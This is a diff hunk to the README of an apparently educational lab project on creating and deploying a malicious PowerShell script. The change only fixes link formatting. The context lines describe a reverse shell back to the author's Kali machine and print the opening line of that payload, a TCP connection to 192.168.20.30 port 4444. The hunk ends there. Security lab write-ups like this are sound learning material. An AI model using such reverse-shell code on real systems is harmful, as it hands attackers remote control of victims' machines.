@@ -21,7 +21,7 @@ This project demonstrates how to create and deploy a malicious PowerShell script
 
 ### 1. **Create Malicious PowerShell Payload**
 
-Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this git and forum (([git](https://github.com/das-lab/mpsd) and [this](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):
+Firstly, I created a malicious PowerShell script (`malicious.ps1`) that establishes a reverse shell back to my Kali's machine, based on this [git](https://github.com/das-lab/mpsd) and [forum](https://learn.microsoft.com/en-us/defender-endpoint/run-detection-test?source=recommendations&view=o365-worldwide):
 
 ```powershell
 $client = New-Object System.Net.Sockets.TCPClient("192.168.20.30", 4444)
